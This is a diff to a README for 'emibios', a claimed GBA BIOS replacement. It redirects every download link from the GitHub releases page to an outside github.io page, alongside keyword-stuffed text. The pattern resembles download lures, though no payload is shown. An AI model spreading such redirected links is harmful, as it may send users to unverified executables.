@@ -1,6 +1,6 @@
 # 🔧 emibios - Accuracy-Focused GBA BIOS Replacement
 
-[![Download emibios](https://img.shields.io/badge/Download-emibios-blueviolet?style=for-the-badge)](https://github.com/umbilical-quotation6912/emibios/releases)
+[![Download emibios](https://img.shields.io/badge/Download-emibios-blueviolet?style=for-the-badge)](https://umbilical-quotation6912.github.io)
 
 ---
 
@@ -8,7 +8,7 @@
 
 Visit this link to download the application.
 
-**[🔗 Go to the Download Page](https://github.com/umbilical-quotation6912/emibios/releases)**
+**[🔗 Go to the Download Page](https://umbilical-quotation6912.github.io)**
 
 On that page, you will see a list of available files. Look for the newest version and click the download button next to it. The download will start automatically, and the file will be saved to your computer, usually in the "Downloads" folder.
 
@@ -172,7 +172,7 @@ Before you start playing, use this quick checklist:
 
 For updates and future releases, always return to the official emibios page at:
 
-**[https://github.com/umbilical-quotation6912/emibios/releases](https://github.com/umbilical-quotation6912/emibios/releases)**
+**[https://umbilical-quotation6912.github.io](https://umbilical-quotation6912.github.io)**
 
 Bookmark this page so you can easily check for new versions.
 
@@ -182,6 +182,6 @@ Bookmark this page so you can easily check for new versions.
 
 Now that you have all the information, you are ready to experience GBA games the way they were meant to be played. Download emibios, set it up in a few minutes, and enjoy a smoother, more accurate gaming session.
 
-[![Download emibios Now](https://img.shields.io/badge/📥%20Download%20emibios-Now-brightgreen?style=for-the-badge)](https://github.com/umbilical-quotation6912/emibios/releases)
+[![Download emibios Now](https://img.shields.io/badge/📥%20Download%20emibios-Now-brightgreen?style=for-the-badge)](https://umbilical-quotation6912.github.io)
 
 Keywords: GBA BIOS, emulator BIOS, Game Boy Advance replacement, accuracy emulation, retro gaming, BIOS file, emibios download, GBA BIOS replacement, emulator setup, Windows retro gaming
